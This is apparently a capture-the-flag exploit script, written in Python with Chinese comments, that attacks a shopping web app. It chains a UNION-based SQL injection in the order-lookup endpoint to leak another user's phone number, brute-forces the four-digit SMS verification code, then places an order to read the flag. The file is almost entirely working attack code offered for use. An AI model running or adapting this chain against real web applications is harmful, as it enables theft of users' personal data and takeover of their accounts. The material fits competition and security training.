# 队名:CC
# exp 提供可以获取到flag的脚本
#  调用方式 ：  python exp.py 192.168.9.3 80
#  time ：20190709
import requests as req
import re
import sys
import json
import random
import time

class exp:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.url = 'http://%s:%s' % (ip, port)
        random.seed(time.time())
        self.username = random.random()
        self.password = '123'
        self.phonenumber = 0
        self.session = req.session()

    def register(self):
        '通过用户名密码注册'
        rs = self.session.get(self.url + '/src/user/register.php',
                              params={'username': self.username, 'password': self.password}, timeout=10)
        status = json.loads(rs.text).get('status')
        data = json.loads(rs.text).get('data')
        if (status):
            print("[+] Register Success.")
            return True
        else:
            print("[-] Register Failed.")
            return False

    def loginByUsername(self):
        '通过用户名密码登录'
        rs = self.session.get(self.url + '/src/user/login.php', params={'username': self.username, 'password': self.password},timeout=10)
        status = json.loads(rs.text).get('status')
        data = json.loads(rs.text).get('data')
        if (status):
            print("[+] Login Success.")
            return True
        else:
            print("[-] Login Failed.")
            return False

    def sqli(self):
        '尝试sql注入获取其他用户手机号'
        sql='1000000 union select 1,database(),(select concat_ws(char(32,58,32),username,phonenumber) from User limit 0,1),4,5;--'
        rs = self.session.get(self.url + '/src/order/getOrderInfo.php', params={'orderId': sql},timeout=10)
        #print(rs.text)
        status = json.loads(rs.text).get('status')
        data = json.loads(rs.text).get('data').get('prodid')
        #print(data)
        if (status):
            self.phonenumber = data.split(':')[1].strip()
            #print(self.phonenumber)
            print("[+] sqli Success.")
            return True
        else:
            print("[-] sqli Failed.")
            return False

    def crackVerifyCode(self):
        '暴力破解手机号验证码'
        crackStatus = False
        while True:
            # 请求发送验证码
            while True:
                rs = self.session.get(self.url + '/src/user/sendVerifyCode.php', params={'phonenumber': self.phonenumber},timeout=10)
                status = json.loads(rs.text).get('status')
                data = json.loads(rs.text).get('data')
                #print(data)
                if (status):
                    break
            # 爆破当前验证码
            for verifycode in range(10000)[6644:]:
                rs = self.session.get(self.url + '/src/user/verifyPhoneVc.php', params={'phonenumber': self.phonenumber, 'verifycode': verifycode},timeout=10)
                crackStatus = json.loads(rs.text).get('status')
                data = json.loads(rs.text).get('data')
                if(crackStatus):# 成功爆破
                    break
            if (crackStatus): # 未爆破成功应该时验证码过期了因此重新尝试
                break

        if (crackStatus):
            print("[+] Crack Verify Code Success.")
            return True
        else:
            print("[-] Crack Verify Code Failed.")
            return False

    def getFlag(self):
        '通过购买商品获取flag'
        rs = self.session.get(self.url + '/src/order/placeAnOrder.php', params={'prodid': 1}, timeout=10)
        status = json.loads(rs.text).get('status')
        data = json.loads(rs.text).get('data')
        matchObj = re.search(r'flag{.*}', data, re.M | re.I)
        if (status and matchObj):
            print("[+] Get Flag Success.")
            print("Flag is:",matchObj.group())
            return True

        else:
            print("[-] Get Flag Failed.")
            return False
        pass




if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Wrong Params")
        print("example: python %s %s %s" % (sys.argv[0], '192.168.9.3', '80'))
        print("Python 3 is needed")
        exit(0)
    host = sys.argv[1]
    port = sys.argv[2]
    exp=exp(host,port)
    if(exp.register()):
        if(exp.loginByUsername()):
            if(exp.sqli()):
                if(exp.crackVerifyCode()):
                    if(exp.getFlag()):
                        pass